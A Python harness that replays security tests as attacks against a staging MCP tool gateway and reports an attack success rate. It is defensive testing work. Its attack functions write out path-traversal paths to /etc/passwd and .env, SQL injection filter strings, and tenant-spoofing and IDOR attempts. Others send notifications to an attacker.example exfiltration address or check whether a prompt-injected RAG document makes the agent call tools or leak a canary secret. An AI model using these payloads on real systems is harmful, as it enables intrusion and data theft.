#!/usr/bin/env python3
"""Attack Success Rate (ASR) harness for the staging MCP tool gateway.

Replays the security scenarios of the locked oracle (tests/test_oracle.py) as
attacks and reports how many of them succeed. An attack "succeeds" only on hard
evidence: backend state (SQLite rows, outbox, audit log) when the database is
reachable, otherwise the raw HTTP response (status code, canary or tenant_b data
in the body). No LLM judgment.

Usage:
  python scripts/attack_baseline.py                          # in-process, fresh temp DB per attack
  python scripts/attack_baseline.py --base-url http://127.0.0.1:8000 [--db-path /tmp/staging.db]
  python scripts/attack_baseline.py --label baseline --max-asr 0.6

Writes reports/asr_<label>.json and reports/asr_<label>.md, appends one
"attempt" event per attack to the metrics log (scripts/metrics.py), and exits 1
when --max-asr is given and the measured ASR is above it.
"""
import argparse
import datetime as dt
import importlib
import json
import os
import sqlite3
import subprocess
import sys
import tempfile
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "scripts"))
import metrics  # noqa: E402

CANARY = os.getenv("CANARY_SECRET", "sk_canary_test_999")
TOKENS = {
    "alice": "rp_test_alice_tenant_a",   # tenant_a member
    "erin": "rp_test_erin_tenant_a",     # tenant_a editor
    "ada": "rp_test_ada_tenant_a",       # tenant_a admin
    "bob": "rp_test_bob_tenant_b",       # tenant_b member
}
TENANT_B_MARKERS = ("Confidential Tenant B", "Private Audit", "Payroll Export")


class Target:
    """Either the app in-process (TestClient + temp DB) or a running URL."""

    def __init__(self, base_url: Optional[str], db_path: Optional[str]):
        self.base_url = base_url
        self.db_path = db_path
        self._gateway = None
        if base_url:
            import httpx
            self.http = httpx.Client(base_url=base_url, timeout=10)
        else:
            tmp = tempfile.mkdtemp(prefix="redpatch-attack-")
            os.environ["DB_PATH"] = os.path.join(tmp, "staging.db")
            os.environ["DATA_DIR"] = os.path.join(tmp, "data")
            os.environ.setdefault("CANARY_SECRET", CANARY)
            sys.path.insert(0, str(REPO_ROOT))
            self._gateway = importlib.import_module("app")
            from fastapi.testclient import TestClient
            self.http = TestClient(self._gateway.app)
            self.db_path = self._gateway.DB_PATH

    @property
    def mode(self) -> str:
        return "remote" if self.base_url else "in-process"

    @property
    def has_db(self) -> bool:
        return bool(self.db_path) and os.path.exists(self.db_path)

    def reset(self) -> None:
        if self._gateway is not None and hasattr(self._gateway, "init_db"):
            self._gateway.init_db()

    def headers(self, who: Optional[str], tenant: Optional[str] = None) -> Dict[str, str]:
        h = {"Authorization": f"Bearer {TOKENS[who]}"} if who else {}
        if tenant:
            h["X-Tenant-ID"] = tenant
        return h

    def tool(self, who: Optional[str], name: str, tenant: Optional[str] = None, **args):
        body: Dict[str, Any] = {"tool_name": name, "args": args}
        for key in ("record_id", "query"):  # also accept the original top-level request shape
            if isinstance(args.get(key), (int, str)) and not isinstance(args.get(key), bool):
                body.setdefault(key, args[key])
        return self.http.post("/agent/run", headers=self.headers(who, tenant), json=body)

    def chat(self, who: str, message: str):
        return self.http.post("/agent/chat", headers=self.headers(who), json={"message": message})

    def rows(self, sql: str, params: Tuple = ()) -> Optional[List[Tuple]]:
        if not self.has_db:
            return None
        conn = sqlite3.connect(self.db_path)
        try:
            return conn.execute(sql, params).fetchall()
        except sqlite3.Error:
            return None
        finally:
            conn.close()


# An attack returns (succeeded, evidence). succeeded=None means inconclusive.
Outcome = Tuple[Optional[bool], str]


def _tenant_b_leak(text: str) -> Optional[str]:
    return next((m for m in TENANT_B_MARKERS if m in text), None)


def _leak_evidence(resp) -> Optional[str]:
    if CANARY in resp.text:
        return f"canary in HTTP {resp.status_code} response"
    marker = _tenant_b_leak(resp.text)
    if marker:
        return f"tenant_b data ({marker!r}) in HTTP {resp.status_code} response"
    return None


def _status(resp) -> str:
    return f"HTTP {resp.status_code}"


# --- attacks (each mirrors one or more oracle security tests) ---------------

def a_canary_in_summary(t: Target) -> Outcome:
    resp = t.tool("alice", "get_summary", "tenant_a", record_id=1)
    ev = _leak_evidence(resp)
    return (bool(ev), ev or f"{_status(resp)}, no canary")


def a_idor_get_summary(t: Target) -> Outcome:
    resp = t.tool("alice", "get_summary", "tenant_a", record_id=2)
    ev = _leak_evidence(resp)
    if ev or resp.status_code == 200:
        return True, ev or "HTTP 200 for another tenant's record"
    return False, f"{_status(resp)}"


def a_unallowlisted_tool(t: Target) -> Outcome:
    resp = t.tool("alice", "export_all_users", "tenant_a")
    return (resp.status_code != 403, f"{_status(resp)} (expected 403)")


def a_unauthenticated_call(t: Target) -> Outcome:
    resp = t.tool(None, "list_tickets", "tenant_a")
    return (resp.status_code == 200, f"{_status(resp)} with only X-Tenant-ID, no token")


def a_tenant_header_spoof(t: Target) -> Outcome:
    for args in ({"name": "get_summary", "record_id": 2}, {"name": "list_tickets"}):
        name = args.pop("name")
        resp = t.tool("alice", name, "tenant_b", **args)
        ev = _leak_evidence(resp)
        if ev:
            return True, f"{name} with X-Tenant-ID: tenant_b -> {ev}"
    return False, "tenant_b data never returned for alice's token"


def a_search_docs_cross_tenant(t: Target) -> Outcome:
    for extra in ({}, {"workspace": "tenant_b"}, {"tenant_id": "tenant_b"}):
        resp = t.tool("alice", "search_docs", query="confidential runbook board", **extra)
        ev = _leak_evidence(resp)
        if ev:
            return True, f"search_docs args={extra} -> {ev}"
    return False, "no tenant_b documents in results"


def a_read_file_traversal(t: Target) -> Outcome:
    for path in ("../tenant_b/payroll.csv", "../../.env", "../../../etc/passwd", "/etc/passwd",
                 "reports/../../tenant_b/notes.txt"):
        resp = t.tool("alice", "read_file", path=path)
        ev = _leak_evidence(resp)
        if ev or "root:" in resp.text or resp.status_code == 200:
            return True, f"read_file {path!r} -> {ev or _status(resp)}"
    return False, "every traversal path rejected"


def a_list_files_escape(t: Target) -> Outcome:
    for d in ("..", "../tenant_b", "../.."):
        resp = t.tool("alice", "list_files", dir=d)
        if resp.status_code == 200 or "payroll.csv" in resp.text or ".env" in resp.text:
            return True, f"list_files dir={d!r} -> {_status(resp)}"
    return False, "directory escape rejected"


def a_export_sql_injection(t: Target) -> Outcome:
    for payload in ("' OR '1'='1", "%' OR tenant_id='tenant_b' --",
                    "x' UNION SELECT id, title, body FROM records --"):
        resp = t.tool("alice", "export_records", format="json", filter=payload)
        ev = _leak_evidence(resp)
        if ev:
            return True, f"filter {payload!r} -> {ev}"
    return False, "no tenant_b rows via export filter"


def _record(t: Target, rid: int):
    rows = t.rows("SELECT tenant_id, title, body FROM records WHERE id = ?", (rid,))
    return rows[0] if rows else None


def a_cross_tenant_write(t: Target) -> Outcome:
    before = _record(t, 2)
    resp = t.tool("erin", "update_record", record_id=2, body="pwned by tenant_a")
    if t.has_db:
        after = _record(t, 2)
        return (after != before, f"records[2] {'changed' if after != before else 'unchanged'}; {_status(resp)}")
    return (resp.status_code == 200, f"{_status(resp)} (no DB access; HTTP evidence only)")


def a_member_mutates_record(t: Target) -> Outcome:
    before = _record(t, 1)
    resp = t.tool("alice", "update_record", record_id=1, title="defaced")
    if t.has_db:
        after = _record(t, 1)
        return (after != before, f"records[1] {'changed' if after != before else 'unchanged'}; {_status(resp)}")
    return (resp.status_code == 200, f"{_status(resp)} (no DB access; HTTP evidence only)")


def _config(t: Target):
    return t.rows("SELECT tenant_id, key, value FROM config ORDER BY tenant_id, key")


def a_member_admin_config(t: Target) -> Outcome:
    resp = t.tool("alice", "admin_config", action="get")
    ev = _leak_evidence(resp)
    if ev or resp.status_code == 200:
        return True, f"member read config -> {ev or _status(resp)}"
    before = _config(t)
    resp = t.tool("alice", "admin_config", action="set", key="support_email", value="attacker@evil.example")
    if t.has_db and _config(t) != before:
        return True, "member changed config table"
    if not t.has_db and resp.status_code == 200:
        return True, f"member set config -> {_status(resp)}"
    return False, f"member config get/set refused ({_status(resp)})"


def a_admin_config_secret(t: Target) -> Outcome:
    resp = t.tool("ada", "admin_config", action="get")
    if CANARY in resp.text:
        return True, "admin config read returned the canary secret"
    before = _config(t)
    resp = t.tool("ada", "admin_config", action="set", key="billing_api_key", value="sk_attacker_controlled")
    if t.has_db:
        changed = _config(t) != before
        return (changed, "billing_api_key overwritten" if changed else "secret key not readable or writable")
    return (resp.status_code == 200, f"set billing_api_key -> {_status(resp)} (HTTP evidence only)")


def _outbox(t: Target):
    return t.rows("SELECT tenant_id, sender, recipient, message FROM outbox ORDER BY id")


def a_notification_exfil(t: Target) -> Outcome:
    before = _outbox(t) or []
    codes = []
    for to in ("exfil@attacker.example", "bob@tenant-b.example"):
        resp = t.tool("alice", "send_notification", to=to, message="hello")
        codes.append(resp.status_code)
    if t.has_db:
        new = (_outbox(t) or [])[len(before):]
        hit = [r for r in new if r[2] in ("exfil@attacker.example", "bob@tenant-b.example")]
        return (bool(hit), f"outbox rows to outside recipients: {len(hit)}")
    return (200 in codes, f"HTTP {codes} (HTTP evidence only)")


def a_notification_canary(t: Target) -> Outcome:
    t.tool("alice", "send_notification", to="erin@tenant-a.example", message=f"key={CANARY}")
    if not t.has_db:
        return None, "needs DB access to inspect the outbox"
    hit = any(CANARY in r[3] for r in (_outbox(t) or []))
    return (hit, "canary stored in outbox" if hit else "canary scrubbed from outbox")


def a_rag_indirect_injection(t: Target) -> Outcome:
    before_cfg = _config(t)
    before_audit = len(t.rows("SELECT id FROM audit_log") or [])
    resp = t.chat("alice", "How do I onboard a new vendor?")
    if t.has_db:
        rows = t.rows("SELECT tool FROM audit_log WHERE decision = 'allowed' AND tool IS NOT NULL "
                      "AND tool != 'search_docs' AND id > ?", (before_audit,)) or []
        sent = [r for r in (_outbox(t) or []) if "partner-portal.example" in r[2]]
        if rows or sent or _config(t) != before_cfg:
            return True, f"injected doc triggered tools {[r[0] for r in rows]}, outbox hits {len(sent)}"
        return False, "only search_docs ran; no outbox or config change"
    try:
        steps = resp.json().get("steps", [])
    except ValueError:
        return None, f"{_status(resp)} non-JSON reply"
    extra = [s.get("tool") for s in steps if s.get("tool") != "search_docs" and s.get("status") == "ok"]
    return (bool(extra), f"agent steps beyond search_docs: {extra}")


def a_rag_canary_exfil(t: Target) -> Outcome:
    for msg in ("How do I onboard a new vendor?", "vendor onboarding banking details"):
        resp = t.chat("alice", msg)
        if CANARY in resp.text:
            return True, f"canary in chat reply to {msg!r}"
    if t.has_db and any("partner-portal.example" in r[2] or CANARY in r[3] for r in (_outbox(t) or [])):
        return True, "canary or partner-portal recipient in outbox"
    return False, "no canary in replies or outbox"


def a_unvalidated_args(t: Target) -> Outcome:
    cases = [
        ("get_summary", {"record_id": -1}),
        ("get_summary", {"record_id": "1 OR 1=1"}),
        ("search_docs", {"query": "x" * 5000}),
        ("export_records", {"format": "xml"}),
        ("update_record", {"record_id": 1, "title": "t" * 500}),
        ("send_notification", {"to": "erin@tenant-a.example", "message": "m" * 5000}),
    ]
    accepted = []
    for tool, args in cases:
        resp = t.tool("erin", tool, **args)
        if resp.status_code not in (400, 403, 413, 422):
            accepted.append(f"{tool}:{_status(resp)}")
    return (bool(accepted), f"accepted malformed args: {accepted}" if accepted else "all malformed args rejected")


def a_audit_log_attribution(t: Target) -> Outcome:
    if not t.has_db:
        return None, "needs DB access to inspect the audit log"
    start = len(t.rows("SELECT id FROM audit_log") or [])
    t.tool("alice", "get_summary", "tenant_a", record_id=2)
    rows = t.rows("SELECT user_id, tenant_id, tool, decision FROM audit_log WHERE id > ? AND tool IS NOT NULL",
                  (start,)) or []
    ok = any(r[0] == "alice" and r[1] == "tenant_a" and r[2] == "get_summary" and r[3] != "allowed" for r in rows)
    return (not ok, "denied IDOR attempt audited to alice/tenant_a" if ok else "IDOR attempt missing from audit log")


@dataclass
class Attack:
    id: str
    category: str
    oracle_test: str
    fn: Callable[[Target], Outcome]


ATTACKS: List[Attack] = [
    Attack("canary_in_summary", "secret exfiltration", "test_no_canary_secret_leak", a_canary_in_summary),
    Attack("idor_get_summary", "cross-tenant IDOR", "test_cross_tenant_idor_blocked", a_idor_get_summary),
    Attack("unallowlisted_tool", "tool allowlist", "test_disallowed_tool_blocked", a_unallowlisted_tool),
    Attack("unauthenticated_call", "authentication", "test_unauthenticated_calls_rejected", a_unauthenticated_call),
    Attack("tenant_header_spoof", "cross-tenant IDOR", "test_tenant_header_cannot_override_token", a_tenant_header_spoof),
    Attack("search_docs_cross_tenant", "cross-tenant IDOR", "test_search_docs_is_tenant_scoped", a_search_docs_cross_tenant),
    Attack("read_file_traversal", "unvalidated MCP args", "test_read_file_path_traversal_blocked", a_read_file_traversal),
    Attack("list_files_escape", "unvalidated MCP args", "test_list_files_cannot_escape_tenant_drive", a_list_files_escape),
    Attack("export_sql_injection", "unvalidated MCP args", "test_export_filter_injection_blocked", a_export_sql_injection),
    Attack("cross_tenant_write", "DB mutation", "test_cross_tenant_write_does_not_mutate_db", a_cross_tenant_write),
    Attack("member_mutates_record", "RBAC", "test_member_cannot_mutate_records", a_member_mutates_record),
    Attack("member_admin_config", "RBAC", "test_admin_config_requires_admin_and_never_returns_secrets", a_member_admin_config),
    Attack("admin_config_secret", "secret exfiltration", "test_admin_cannot_overwrite_secret_or_other_tenant_config", a_admin_config_secret),
    Attack("notification_exfil", "exfiltration", "test_notifications_cannot_reach_external_recipients", a_notification_exfil),
    Attack("notification_canary", "secret exfiltration", "test_notifications_never_carry_canary", a_notification_canary),
    Attack("rag_indirect_injection", "indirect prompt injection", "test_rag_injected_instructions_do_not_trigger_tools", a_rag_indirect_injection),
    Attack("rag_canary_exfil", "indirect prompt injection chain", "test_rag_chain_cannot_exfiltrate_canary", a_rag_canary_exfil),
    Attack("unvalidated_args", "unvalidated MCP args", "test_tool_arguments_are_validated", a_unvalidated_args),
    Attack("audit_log_attribution", "audit", "test_every_tool_call_is_audited_with_authenticated_tenant", a_audit_log_attribution),
]


def _git(*args: str) -> str:
    try:
        return subprocess.check_output(["git", *args], cwd=REPO_ROOT, stderr=subprocess.DEVNULL, text=True).strip()
    except (OSError, subprocess.CalledProcessError):
        return "unknown"


def run(target: Target, only: Optional[List[str]] = None, log_metrics: bool = True) -> Dict[str, Any]:
    results = []
    for attack in ATTACKS:
        if only and attack.id not in only:
            continue
        target.reset()
        try:
            succeeded, evidence = attack.fn(target)
        except Exception as exc:  # a crash is not evidence of an exploit
            succeeded, evidence = None, f"harness error: {type(exc).__name__}: {exc}"
        status = {True: "SUCCEEDED", False: "blocked", None: "inconclusive"}[succeeded]
        results.append({"id": attack.id, "category": attack.category, "oracle_test": attack.oracle_test,
                        "result": status, "evidence": evidence.replace(CANARY, "[CANARY]")})
        if log_metrics and succeeded is not None:
            metrics.log_event("attempt", issue=attack.id, blocked=not succeeded, note=target.mode)
    target.reset()
    scored = [r for r in results if r["result"] != "inconclusive"]
    hits = [r for r in scored if r["result"] == "SUCCEEDED"]
    return {
        "generated_at": dt.datetime.now(dt.timezone.utc).isoformat(timespec="seconds"),
        "git_branch": _git("rev-parse", "--abbrev-ref", "HEAD"),
        "git_commit": _git("rev-parse", "--short", "HEAD"),
        "mode": target.mode,
        "target": target.base_url or "app.py (in-process TestClient)",
        "backend_state_checked": target.has_db,
        "attacks_total": len(results),
        "attacks_scored": len(scored),
        "attacks_succeeded": len(hits),
        "attacks_inconclusive": len(results) - len(scored),
        "attack_success_rate": round(len(hits) / len(scored), 4) if scored else None,
        "results": results,
    }


def to_markdown(report: Dict[str, Any]) -> str:
    asr = report["attack_success_rate"]
    lines = [
        f"# Attack Success Rate: {'n/a' if asr is None else f'{asr:.0%}'}",
        "",
        f"- Branch / commit: `{report['git_branch']}` @ `{report['git_commit']}`",
        f"- Target: {report['target']} ({report['mode']})",
        f"- Backend state checked: {'yes' if report['backend_state_checked'] else 'no (HTTP evidence only)'}",
        f"- Generated (UTC): {report['generated_at']}",
        f"- Succeeded: {report['attacks_succeeded']} of {report['attacks_scored']} scored attacks "
        f"({report['attacks_inconclusive']} inconclusive)",
        "",
        "| Attack | Category | Result | Evidence | Oracle test |",
        "|---|---|---|---|---|",
    ]
    for r in report["results"]:
        ev = r["evidence"].replace("|", "\\|")
        lines.append(f"| `{r['id']}` | {r['category']} | {r['result']} | {ev} | `{r['oracle_test']}` |")
    return "\n".join(lines) + "\n"


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--base-url", help="attack a running gateway instead of importing app.py")
    p.add_argument("--db-path", help="SQLite path of the running gateway, for backend-state checks")
    p.add_argument("--label", default="run", help="report name suffix, e.g. baseline or patched")
    p.add_argument("--out-dir", default=str(REPO_ROOT / "reports"))
    p.add_argument("--only", nargs="*", help="run only these attack ids")
    p.add_argument("--max-asr", type=float, help="exit 1 if ASR is above this (0 = every attack must be blocked)")
    p.add_argument("--no-metrics", action="store_true", help="do not append attempts to the metrics log")
    args = p.parse_args()

    report = run(Target(args.base_url, args.db_path), args.only, log_metrics=not args.no_metrics)
    out = Path(args.out_dir)
    out.mkdir(parents=True, exist_ok=True)
    (out / f"asr_{args.label}.json").write_text(json.dumps(report, indent=2) + "\n")
    (out / f"asr_{args.label}.md").write_text(to_markdown(report))

    asr = report["attack_success_rate"]
    for r in report["results"]:
        print(f"{r['result']:>12}  {r['id']:<26} {r['evidence']}")
    print(f"\nASR = {report['attacks_succeeded']}/{report['attacks_scored']}"
          f" = {'n/a' if asr is None else f'{asr:.1%}'}  -> {out / f'asr_{args.label}.md'}")
    if args.max_asr is not None and (asr is None or asr > args.max_asr):
        print(f"FAIL: ASR above allowed maximum {args.max_asr:.0%}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
